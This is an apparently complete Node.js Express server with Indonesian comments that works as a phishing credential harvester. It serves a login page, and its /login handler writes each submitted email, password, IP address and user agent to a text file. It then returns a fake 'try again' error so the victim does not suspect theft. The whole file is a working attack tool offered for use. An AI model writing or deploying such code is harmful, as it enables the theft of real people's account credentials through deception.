const express = require('express');
const fs = require('fs');
const path = require('path');
const bodyParser = require('body-parser');
const app = express();
// const PORT = process.env.PORT || 5000;
const port = 5000;

// Middleware untuk parsing form data
app.use(bodyParser.urlencoded({ extended: false }));

// Menetapkan folder "public" sebagai folder untuk file statis
app.use(express.static(path.join(__dirname, '/', 'public')));

// Rute untuk halaman utama
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Rute untuk menangani data login
app.post('/login', (req, res) => {
  const email = req.body.email;
  const password = req.body.password;
  const ip = req.ip;
  const userAgent = req.headers['user-agent'];

  // Format data untuk disimpan
  const data = `Email: ${email}\nPassword: ${password}\nIP: ${ip}\nUser-Agent: ${userAgent}\n\n`;

  // Menyimpan data ke dalam file result.txt
  fs.appendFile('chace/result.txt', data, (err) => {
    if (err) {
      console.error('Error writing to file', err);
      return res.status(500).send('Internal Server Error');
    }
    // Mengirim respons sukses ke klien
    res.send('Error: Coba lagi');
  });
});

// Menjalankan server pada port 3000
app.listen(port, () => {
  console.log(`Server berjalan di http://localhost:${port}`);
});
